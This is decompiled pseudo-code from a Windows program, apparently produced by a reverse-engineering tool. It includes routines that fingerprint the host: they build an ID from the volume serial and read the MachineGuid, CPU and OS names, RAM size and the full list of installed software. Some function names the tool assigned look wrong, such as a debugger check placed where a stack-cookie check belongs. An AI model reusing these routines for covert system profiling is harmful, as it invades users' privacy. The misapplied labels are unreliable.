{
  undefined *puVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined extraout_DL;
  int *unaff_EDI;
  int **in_FS_OFFSET;
  undefined *local_28 [3];
  int local_1c;
  int local_18;
  undefined *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2c98;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  std::_Lockit::_Lockit((_Lockit *)&local_1c,0);
  puVar1 = DAT_003d9820;
  local_8 = 0;
  local_14 = DAT_003d9820;
  if (DAT_003ea030 == 0) {
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (DAT_003ea030 == 0) {
      DAT_003d7b04 = DAT_003d7b04 + 1;
      DAT_003ea030 = DAT_003d7b04;
    }
    FUN_003ae995(&local_18);
  }
  uVar2 = DAT_003ea030;
  iVar3 = *unaff_EDI;
  if (DAT_003ea030 < *(uint *)(iVar3 + 0xc)) {
    puVar4 = *(undefined **)(*(int *)(iVar3 + 8) + DAT_003ea030 * 4);
    if (puVar4 == (undefined *)0x0) goto LAB_003a346c;
LAB_003a348a:
    if (puVar4 != (undefined *)0x0) goto LAB_003a34f3;
  }
  else {
    puVar4 = (undefined *)0x0;
LAB_003a346c:
    if (*(char *)(iVar3 + 0x14) == '\0') goto LAB_003a348a;
    iVar3 = _ENGINE_get_table_flags();
    if (uVar2 < *(uint *)(iVar3 + 0xc)) {
      puVar4 = *(undefined **)(*(int *)(iVar3 + 8) + uVar2 * 4);
      goto LAB_003a348a;
    }
  }
  puVar4 = puVar1;
  if (puVar1 == (undefined *)0x0) {
    iVar3 = FUN_003a3520(&local_14);
    puVar4 = local_14;
    if (iVar3 == -1) {
      FUN_003b0a93(local_28,extraout_DL,0xc);
                    // WARNING: Subroutine does not return
      __CxxThrowException_8(local_28,&DAT_003d320c);
    }
    DAT_003d9820 = local_14;
    std::_Lockit::_Lockit((_Lockit *)&local_18,0);
    if (*(int *)(puVar4 + 4) != -1) {
      *(int *)(puVar4 + 4) = *(int *)(puVar4 + 4) + 1;
    }
    FUN_003ae995(&local_18);
    Facet_Register(puVar4);
  }
LAB_003a34f3:
  local_8 = 0xffffffff;
  FUN_003ae995(&local_1c);
  *in_FS_OFFSET = local_10;
  return puVar4;
}



undefined4 __cdecl FUN_003a3520(undefined **param_1)

{
  undefined **ppuVar1;
  int **in_FS_OFFSET;
  int local_38 [9];
  undefined **local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2d0b;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  local_14 = (undefined **)0x0;
  if ((param_1 != (undefined **)0x0) && (*param_1 == (undefined *)0x0)) {
    ppuVar1 = (undefined **)FUN_003b103e(8);
    local_8 = 0;
    local_14 = ppuVar1;
    if (ppuVar1 == (undefined **)0x0) {
      ppuVar1 = (undefined **)0x0;
    }
    else {
      FUN_00399290((_Lockit *)local_38);
      ppuVar1[1] = (undefined *)0x0;
      *ppuVar1 = (undefined *)std::codecvt<char,char,int>::vftable;
    }
    local_8 = 0xffffffff;
    *param_1 = (undefined *)ppuVar1;
    if (ppuVar1 != (undefined **)0x0) {
      FUN_00399330(local_38);
    }
  }
  *in_FS_OFFSET = local_10;
  return 2;
}



int * __cdecl FUN_003a35d0(int *param_1,void *param_2,byte param_3)

{
  int *piVar1;
  int *piVar2;
  bool bVar3;
  undefined4 uVar4;
  void *this;
  uint uVar5;
  uint uVar6;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3ae0;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  uVar6 = 0;
  bVar3 = false;
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 4))();
  }
  local_8 = 0;
  uVar4 = FUN_003a2920();
  if ((char)uVar4 != '\0') {
    local_8 = 2;
    FUN_003898c0(param_2,(int *)0x0,0xffffffff);
    piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
    if ((*(byte **)piVar1[8] == (byte *)0x0) || (*(int *)piVar1[0xc] < 1)) {
      uVar5 = (**(code **)(*piVar1 + 0x18))();
    }
    else {
      uVar5 = (uint)**(byte **)piVar1[8];
    }
    while (uVar6 = 0, uVar5 != 0xffffffff) {
      if (uVar5 == param_3) {
        piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
        bVar3 = true;
        if ((*(int *)piVar1[8] == 0) || (piVar2 = (int *)piVar1[0xc], *piVar2 < 1)) {
          (**(code **)(*piVar1 + 0x1c))();
        }
        else {
          *piVar2 = *piVar2 + -1;
          *(int *)piVar1[8] = *(int *)piVar1[8] + 1;
        }
        goto LAB_003a3740;
      }
      if (0xfffffffd < *(uint *)((int)param_2 + 0x10)) {
        uVar6 = 2;
        goto LAB_003a3740;
      }
      FUN_003a17b0();
      bVar3 = true;
      uVar5 = FUN_003a1960();
    }
    uVar6 = 1;
LAB_003a3740:
    if (bVar3) goto LAB_003a3749;
  }
  uVar6 = uVar6 | 2;
LAB_003a3749:
  local_8 = 1;
  this = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
  if (uVar6 != 0) {
    uVar6 = *(uint *)((int)this + 0xc) | uVar6;
    if (*(int *)((int)this + 0x38) == 0) {
      uVar6 = uVar6 | 4;
    }
    *(uint *)((int)this + 0xc) = uVar6 & 0x17;
    if ((*(uint *)((int)this + 0x10) & uVar6 & 0x17) != 0) {
      FUN_00399780(this,(char *)0x0);
    }
  }
  local_8 = 0xffffffff;
  piVar1 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 8))();
  }
  *in_FS_OFFSET = local_10;
  return param_1;
}



undefined * Catch_All_003a3702(void)

{
  uint uVar1;
  void *this;
  int unaff_EBP;
  
  this = (void *)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8));
  uVar1 = *(uint *)((int)this + 0xc) & 0x17 | 4;
  *(uint *)((int)this + 0xc) = uVar1;
  if ((*(uint *)((int)this + 0x10) & uVar1) != 0) {
    FUN_00399780(this,(char *)0x1);
  }
  *(undefined4 *)(unaff_EBP + -4) = 1;
  return &DAT_003a373a;
}



void ** __thiscall FUN_003a37b0(void *this,void **param_1,void **param_2)

{
  void **ppvVar1;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 uStack8;
  
  uStack8 = 0xffffffff;
  puStack12 = &LAB_003c35b1;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  for (ppvVar1 = (void **)((int)this + 0x14); ppvVar1 + -5 != param_1; ppvVar1 = ppvVar1 + 7) {
    if (param_2 != (void **)0x0) {
      param_2[5] = (void *)0x7;
      param_2[4] = (void *)0x0;
      *(undefined2 *)param_2 = 0;
      if (param_2 != ppvVar1 + -5) {
        if ((void *)0x7 < param_2[5]) {
          FUN_003aee4b(*param_2);
        }
        param_2[5] = (void *)0x7;
        param_2[4] = (void *)0x0;
        *(undefined2 *)param_2 = 0;
        if (*ppvVar1 < (void *)0x8) {
          FID_conflict__memcpy(param_2,ppvVar1 + -5,((int)ppvVar1[-1] + 1) * 2);
        }
        else {
          *param_2 = ppvVar1[-5];
          ppvVar1[-5] = (void *)0x0;
        }
        param_2[4] = ppvVar1[-1];
        param_2[5] = *ppvVar1;
        ppvVar1[-1] = (void *)0x0;
        *ppvVar1 = (void *)0x0;
      }
    }
    param_2 = param_2 + 7;
  }
  *in_FS_OFFSET = local_10;
  return param_2;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a3880(void)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  char *_Str;
  undefined4 ****ppppuVar5;
  size_t sVar6;
  int **ppiVar7;
  undefined *puVar8;
  undefined4 *****pppppuVar9;
  undefined4 ****extraout_EDX;
  undefined4 ****extraout_EDX_00;
  undefined4 ****extraout_EDX_01;
  undefined4 ****extraout_EDX_02;
  undefined4 ****extraout_EDX_03;
  undefined4 ****extraout_EDX_04;
  undefined4 ****extraout_EDX_05;
  undefined4 ****extraout_EDX_06;
  undefined4 ****extraout_EDX_07;
  undefined4 ****extraout_EDX_08;
  undefined4 ****extraout_EDX_09;
  undefined4 ****extraout_EDX_10;
  undefined4 ****ppppuVar10;
  undefined4 *****pppppuVar11;
  undefined4 *****unaff_EDI;
  int **in_FS_OFFSET;
  undefined uVar12;
  int local_1ec;
  undefined local_1e8;
  undefined2 local_1e7;
  undefined local_1e5;
  undefined4 *****local_1e4;
  void *local_1e0;
  uint local_1cc;
  void *local_1c4;
  undefined4 local_1b4;
  uint local_1b0;
  void *local_1a8;
  undefined4 local_198;
  uint local_194;
  void *local_18c;
  undefined4 local_17c;
  uint local_178;
  void *local_170 [4];
  undefined4 local_160;
  uint local_15c;
  void *local_154 [4];
  undefined4 local_144;
  undefined2 uStack320;
  undefined local_13e;
  undefined uStack317;
  undefined uStack316;
  undefined uStack315;
  undefined4 *****local_138 [4];
  undefined4 ****local_128;
  undefined4 ****local_124;
  undefined local_11c [264];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c356d;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_1e4 = (undefined4 *****)0x0;
  local_1ec = 0;
  local_124 = (undefined4 ****)0xf;
  local_128 = (undefined4 ****)0x0;
  local_138[0] = (undefined4 *****)((uint)local_138[0] & 0xffffff00);
  local_8 = 0;
  iVar1 = (*_DAT_003d9404)(local_11c,0x104,local_14);
  if (iVar1 == 0) {
    local_11c[0] = 0x43;
  }
  puVar8 = &local_1e8;
  local_1e8 = local_11c[0];
  local_1e7 = 0x5c3a;
  local_1e5 = 0;
  (*_DAT_003d9354)(puVar8,0,0,&local_1ec,0,0,0,0);
  iVar1 = local_1ec * 0x14a30b + -0x69427551;
  uVar2 = iVar1 * 0x14a30b + 0x96bd8aaf;
  local_144 = uVar2 & 0xffff | (uint)local_144._2_2_ << 0x10;
  iVar3 = (((uVar2 * 0x14a30b + -0x69427551) * 0x14a30b + -0x69427551) * 0x14a30b + -0x69427551) *
          0x14a30b + -0x69427551;
  local_13e = (undefined)iVar3;
  iVar3 = iVar3 * 0x14a30b + -0x69427551;
  uStack317 = (undefined)iVar3;
  iVar3 = iVar3 * 0x14a30b + -0x69427551;
  uStack316 = (undefined)iVar3;
  iVar3 = iVar3 * 0x14a30b + -0x69427551;
  uStack315 = (undefined)iVar3;
  local_1ec = (iVar3 * 0x14a30b + -0x69427551) * 0x14a30b + -0x69427551;
  uVar4 = (*_DAT_003d957c)(0,0x104);
  _Str = (char *)(*_DAT_003d9504)(uVar4);
  uVar12 = SUB41(puVar8,0);
  if (_Str == (char *)0x0) {
    unaff_EDI[5] = (undefined4 ****)0xf;
    unaff_EDI[4] = (undefined4 ****)0x0;
    *(undefined *)unaff_EDI = 0;
    ppppuVar5 = (undefined4 ****)_strlen((char *)0x0);
    ppppuVar10 = extraout_EDX;
    if (ppppuVar5 == (undefined4 ****)0xffffffff) {
      FUN_003ae350("string too long");
      ppppuVar10 = extraout_EDX_00;
    }
    if (unaff_EDI[5] < ppppuVar5) {
      FUN_00389950(unaff_EDI,ppppuVar5,unaff_EDI[4]);
      ppppuVar10 = extraout_EDX_01;
      if (ppppuVar5 != (undefined4 ****)0x0) {
LAB_003a3a28:
        pppppuVar9 = unaff_EDI;
        if ((undefined4 ****)0xf < unaff_EDI[5]) {
          pppppuVar9 = (undefined4 *****)*unaff_EDI;
        }
        FUN_003aee70(pppppuVar9,(undefined4 *)0x0,(uint)ppppuVar5);
        unaff_EDI[4] = ppppuVar5;
        if ((undefined4 ****)0xf < unaff_EDI[5]) {
          unaff_EDI = (undefined4 *****)*unaff_EDI;
        }
        *(byte *)((int)unaff_EDI + (int)ppppuVar5) = 0;
        ppppuVar10 = extraout_EDX_02;
      }
    }
    else {
      if (ppppuVar5 != (undefined4 ****)0x0) goto LAB_003a3a28;
      unaff_EDI[4] = (undefined4 ****)0x0;
      if (unaff_EDI[5] < (undefined4 ****)0x10) {
        *(undefined *)unaff_EDI = 0;
      }
      else {
        *(byte *)*unaff_EDI = 0;
      }
    }
  }
  else {
    (*_DAT_003d9374)(_Str,"%08lX%04lX%lu-",iVar1,local_144 & 0xffff,
                     CONCAT13(uStack315,CONCAT12(uStack316,CONCAT11(uStack317,local_13e))));
    sVar6 = _strlen(_Str);
    FUN_00395d90(local_138,sVar6);
    uVar12 = SUB41(puVar8,0);
    pppppuVar9 = local_138[0];
    if (local_124 < (undefined4 ****)0x10) {
      pppppuVar9 = local_138;
    }
    local_1e4 = (undefined4 *****)((int)pppppuVar9 + (int)local_128);
    pppppuVar11 = local_138[0];
    if (local_124 < (undefined4 ****)0x10) {
      pppppuVar11 = local_138;
    }
    if (pppppuVar11 != local_1e4) {
      iVar1 = (int)pppppuVar9 - (int)pppppuVar11;
      do {
        iVar3 = _tolower((uint)*(byte *)pppppuVar11);
        uVar12 = SUB41(puVar8,0);
        *(byte *)((int)pppppuVar11 + iVar1) = (byte)iVar3;
        pppppuVar11 = (undefined4 *****)((int)pppppuVar11 + 1);
      } while (pppppuVar11 != local_1e4);
    }
    ppiVar7 = (int **)FUN_003a43a0();
    local_8._0_1_ = 1;
    local_1e4 = (undefined4 *****)FUN_00395990((int *)0x14,ppiVar7,(int *)0x11);
    local_8._0_1_ = 2;
    ppiVar7 = (int **)FUN_003a4420();
    local_8._0_1_ = 3;
    FUN_00395990((int *)0x0,ppiVar7,(int *)0x18);
    local_8._0_1_ = 4;
    puVar8 = FUN_003a5230((undefined *)local_170);
    local_8 = CONCAT31(local_8._1_3_,5);
    pppppuVar9 = (undefined4 *****)FUN_00389b80(puVar8,(undefined *)local_154);
    ppppuVar10 = extraout_EDX_03;
    if (local_138 != (undefined4 ******)pppppuVar9) {
      if ((undefined4 ****)0xf < local_124) {
        FUN_003aee4b(local_138[0]);
      }
      local_124 = (undefined4 ****)0xf;
      local_128 = (undefined4 ****)0x0;
      local_138[0] = (undefined4 *****)((uint)local_138[0] & 0xffffff00);
      if (pppppuVar9[5] < (undefined4 ****)0x10) {
        FID_conflict__memcpy(local_138,pppppuVar9,(size_t)((int)pppppuVar9[4] + 1));
      }
      else {
        local_138[0] = (undefined4 *****)*pppppuVar9;
        *pppppuVar9 = (undefined4 ****)0x0;
      }
      local_128 = pppppuVar9[4];
      ppppuVar10 = pppppuVar9[5];
      pppppuVar9[4] = (undefined4 ****)0x0;
      pppppuVar9[5] = (undefined4 ****)0x0;
      local_124 = ppppuVar10;
    }
    if (0xf < CONCAT13(uStack317,CONCAT12(local_13e,uStack320))) {
      FUN_003aee4b(local_154[0]);
      ppppuVar10 = extraout_EDX_04;
    }
    uStack320 = 0xf;
    local_13e = 0;
    uStack317 = 0;
    local_144 = 0;
    local_154[0] = (void *)((uint)local_154[0] & 0xffffff00);
    if (0xf < local_15c) {
      FUN_003aee4b(local_170[0]);
      ppppuVar10 = extraout_EDX_05;
    }
    local_15c = 0xf;
    local_160 = 0;
    local_170[0] = (void *)((uint)local_170[0] & 0xffffff00);
    if (0xf < local_194) {
      FUN_003aee4b(local_1a8);
      ppppuVar10 = extraout_EDX_06;
    }
    local_194 = 0xf;
    local_198 = 0;
    local_1a8 = (void *)((uint)local_1a8 & 0xffffff00);
    if (0xf < local_178) {
      FUN_003aee4b(local_18c);
      ppppuVar10 = extraout_EDX_07;
    }
    local_178 = 0xf;
    local_17c = 0;
    local_18c = (void *)((uint)local_18c & 0xffffff00);
    if (0xf < local_1b0) {
      FUN_003aee4b(local_1c4);
      ppppuVar10 = extraout_EDX_08;
    }
    local_1b0 = 0xf;
    local_1b4 = 0;
    local_1c4 = (void *)((uint)local_1c4 & 0xffffff00);
    if (0xf < local_1cc) {
      FUN_003aee4b(local_1e0);
      ppppuVar10 = extraout_EDX_09;
    }
    unaff_EDI[5] = (undefined4 ****)0xf;
    unaff_EDI[4] = (undefined4 ****)0x0;
    *(undefined *)unaff_EDI = 0;
    if ((undefined4 ******)unaff_EDI != local_138) {
      if ((undefined4 ****)0xf < unaff_EDI[5]) {
        FUN_003aee4b(*unaff_EDI);
      }
      unaff_EDI[5] = (undefined4 ****)0xf;
      unaff_EDI[4] = (undefined4 ****)0x0;
      *(undefined *)unaff_EDI = 0;
      if (local_124 < (undefined4 ****)0x10) {
        FID_conflict__memcpy(unaff_EDI,local_138,(size_t)((int)local_128 + 1));
        unaff_EDI[4] = local_128;
        unaff_EDI[5] = local_124;
        ppppuVar10 = local_128;
      }
      else {
        *unaff_EDI = local_138[0];
        unaff_EDI[4] = local_128;
        unaff_EDI[5] = local_124;
        ppppuVar10 = local_128;
      }
      goto LAB_003a3db4;
    }
  }
  if ((undefined4 ****)0xf < local_124) {
    FUN_003aee4b(local_138[0]);
    ppppuVar10 = extraout_EDX_10;
  }
LAB_003a3db4:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,ppppuVar10,uVar12);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a3de0(void)

{
  int **_Str;
  int *piVar1;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar2;
  undefined unaff_BL;
  undefined *unaff_ESI;
  int **in_FS_OFFSET;
  undefined local_58 [20];
  undefined4 local_44;
  undefined4 local_34;
  void *local_30;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3f38;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_34 = 0;
  (*_DAT_003d940c)(local_58,local_14);
  _Str = (int **)FUN_003a5670(local_44);
  local_8 = 0;
  if ((int *)0xf < _Str[5]) {
    _Str = (int **)*_Str;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar1 = (int *)_strlen((char *)_Str);
  FUN_003894c0(unaff_ESI,_Str,piVar1);
  uVar2 = extraout_EDX;
  if (0xf < local_1c) {
    FUN_003aee4b(local_30);
    uVar2 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar2,unaff_BL);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_003a3e90(void)

{
  int iVar1;
  PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX p_Var2;
  uint uVar3;
  PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX Buffer;
  DWORD DVar4;
  int local_c;
  uint local_8;
  
  Buffer = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)0x0;
  local_8 = 0;
  uVar3 = 0;
  local_c = 0;
  DVar4 = 0;
  iVar1 = GetLogicalProcessorInformationEx
                    (RelationAll,(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)0x0,&local_8);
  while( true ) {
    if (iVar1 != 0) {
      p_Var2 = Buffer;
      if (local_8 != 0) {
        do {
          p_Var2 = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)((int)&p_Var2->Relationship + DVar4);
          if (p_Var2->Relationship == RelationProcessorCore) {
            local_c = local_c + 1;
          }
          DVar4 = p_Var2->Size;
          uVar3 = uVar3 + DVar4;
        } while (uVar3 < local_8);
      }
      _free(Buffer);
      return local_c;
    }
    iVar1 = (*_DAT_003d94e8)();
    if (iVar1 != 0x7a) break;
    if (Buffer != (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)0x0) {
      _free(Buffer);
    }
    Buffer = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)_malloc(local_8);
    if (Buffer == (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)0x0) {
      return 0;
    }
    iVar1 = GetLogicalProcessorInformationEx(RelationAll,Buffer,&local_8);
  }
  if (Buffer != (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)0x0) {
    _free(Buffer);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a3f50(void)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined *puVar2;
  undefined4 local_210;
  undefined4 local_20c;
  undefined local_208 [256];
  undefined local_108;
  undefined local_107 [255];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_210 = 0xff;
  local_108 = 0;
  trim_string((undefined (*) [16])local_107,0,0xfe);
  iVar1 = (*_DAT_003d9448)(0x80000002,"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",0,0x20119
                           ,&local_20c);
  if (iVar1 == 0) {
    (*_DAT_003d942c)(local_20c,"ProcessorNameString",0,0,&local_108,&local_210);
  }
  (*_DAT_003d94d0)(local_20c);
  puVar2 = &local_108;
  (*_DAT_003d9384)(puVar2,local_208);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,(char)puVar2);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4010(void)

{
  int iVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  undefined8 uVar4;
  undefined uVar5;
  char *pcVar6;
  undefined4 local_c1c;
  int local_c18;
  undefined4 local_c14;
  undefined4 local_c10;
  undefined4 local_c0c;
  undefined local_c08 [1024];
  undefined local_808 [1024];
  undefined local_408 [1024];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  pcVar6 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
  local_c14 = 0;
  local_c10 = 0;
  local_c1c = 0xf003f;
  local_c0c = 0;
  uVar4 = (*_DAT_003d9448)(0x80000002,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",0,
                           0x20019,&local_c14);
  uVar3 = (undefined4)((ulonglong)uVar4 >> 0x20);
  uVar5 = SUB41(pcVar6,0);
  if ((int)uVar4 == 0) {
    local_c18 = 0;
    do {
      local_c0c = 0x400;
      iVar1 = (*_DAT_003d9574)(local_c14,local_c18,local_c08,&local_c0c,0,0,0,0);
      if (iVar1 == 0) {
        (*_DAT_003d9374)(local_808,"%s\\%s",
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",local_c08);
        iVar2 = (*_DAT_003d9448)(0x80000002,local_808,0,0x20019,&local_c10);
        uVar5 = SUB41(pcVar6,0);
        if (iVar2 != 0) {
          (*_DAT_003d94d0)(local_c10);
          break;
        }
        local_c0c = 0x400;
        iVar2 = (*_DAT_003d942c)(local_c10,"DisplayName",0,&local_c1c,local_408,&local_c0c);
        if (iVar2 == 0) {
          (*_DAT_003d9520)();
          local_c0c = 0x400;
          iVar2 = (*_DAT_003d942c)(local_c10,"DisplayVersion",0,&local_c1c,local_408,&local_c0c);
          if (iVar2 == 0) {
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
            (*_DAT_003d9520)();
          }
          (*_DAT_003d9520)();
        }
        (*_DAT_003d94d0)(local_c10);
      }
      uVar5 = SUB41(pcVar6,0);
      local_c18 = local_c18 + 1;
    } while (iVar1 == 0);
    (*_DAT_003d94d0)(local_c14);
    uVar3 = extraout_EDX;
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar3,uVar5);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a41f0(void)

{
  undefined uVar1;
  undefined4 uVar2;
  int iVar3;
  uint uVar4;
  undefined4 extraout_EDX;
  undefined4 local_4c [2];
  uint local_44;
  uint local_40;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar1 = (*_DAT_003d957c)(0,0x104);
  uVar2 = (*_DAT_003d9504)();
  trim_string((undefined (*) [16])local_4c,0,0x40);
  local_4c[0] = 0x40;
  iVar3 = (*_DAT_003d95d8)(local_4c);
  if (iVar3 == 1) {
    uVar4 = local_44 >> 0x14 | local_40 << 0xc;
    local_40 = local_40 >> 0x14;
  }
  else {
    uVar4 = 0;
    local_40 = 0;
  }
  (*_DAT_003d9374)(uVar2,"%d MB",uVar4,local_40);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar1);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4280(void)

{
  undefined8 uVar1;
  undefined *puVar2;
  undefined4 local_800c;
  undefined local_8008 [32768];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  puVar2 = local_8008;
  local_800c = 0x7fff;
  uVar1 = (*_DAT_003d94f8)(puVar2,&local_800c);
  terminate_if_debugger_present
            (local_8 ^ (uint)&stack0xfffffffc,(int)((ulonglong)uVar1 >> 0x20),(char)puVar2);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a42e0(void)

{
  int iVar1;
  undefined4 extraout_EDX;
  undefined *puVar2;
  undefined4 local_210;
  undefined4 local_20c;
  undefined local_208 [256];
  undefined local_108;
  undefined local_107 [255];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_210 = 0xff;
  local_108 = 0;
  trim_string((undefined (*) [16])local_107,0,0xfe);
  iVar1 = (*_DAT_003d9448)(0x80000002,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",0,0x20119,
                           &local_20c);
  if (iVar1 == 0) {
    (*_DAT_003d942c)(local_20c,"ProductName",0,0,&local_108,&local_210);
  }
  (*_DAT_003d94d0)(local_20c);
  puVar2 = &local_108;
  (*_DAT_003d9384)(puVar2,local_208);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,(char)puVar2);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a43a0(void)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_EDX;
  undefined *unaff_ESI;
  char *pcVar3;
  undefined uVar4;
  undefined *puVar5;
  undefined local_84 [4];
  int *local_80 [30];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  puVar5 = local_84;
  iVar1 = (*_DAT_003d9370)(puVar5,0);
  uVar4 = SUB41(puVar5,0);
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  if (iVar1 == 0) {
    piVar2 = (int *)_strlen("Unknown");
    pcVar3 = "Unknown";
  }
  else {
    piVar2 = (int *)_strlen((char *)local_80);
    pcVar3 = (char *)local_80;
  }
  FUN_003894c0(unaff_ESI,(int **)pcVar3,piVar2);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4420(void)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_EDX;
  undefined *unaff_ESI;
  undefined uVar3;
  undefined *puVar4;
  undefined4 local_210;
  undefined4 local_20c;
  int *local_208 [64];
  undefined local_108;
  undefined local_107 [255];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_20c = 0xff;
  local_108 = 0;
  trim_string((undefined (*) [16])local_107,0,0xfe);
  iVar1 = (*_DAT_003d9448)(0x80000002,"SOFTWARE\\Microsoft\\Cryptography",0,0x20119,&local_210);
  if (iVar1 == 0) {
    (*_DAT_003d942c)(local_210,"MachineGuid",0,0,&local_108,&local_20c);
  }
  (*_DAT_003d94d0)(local_210);
  puVar4 = &local_108;
  (*_DAT_003d9384)(puVar4,local_208);
  uVar3 = SUB41(puVar4,0);
  *(undefined4 *)(unaff_ESI + 0x14) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *unaff_ESI = 0;
  piVar2 = (int *)_strlen((char *)local_208);
  FUN_003894c0(unaff_ESI,local_208,piVar2);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar3);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003a4510(undefined *param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  void *pvVar4;
  undefined *puVar5;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  int **in_FS_OFFSET;
  undefined uVar6;
  void *local_84;
  uint local_70;
  void *local_68;
  uint local_54;
  void *local_4c [4];
  undefined4 local_3c;
  uint local_38;
  void *local_30 [4];
  undefined4 local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3f00;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
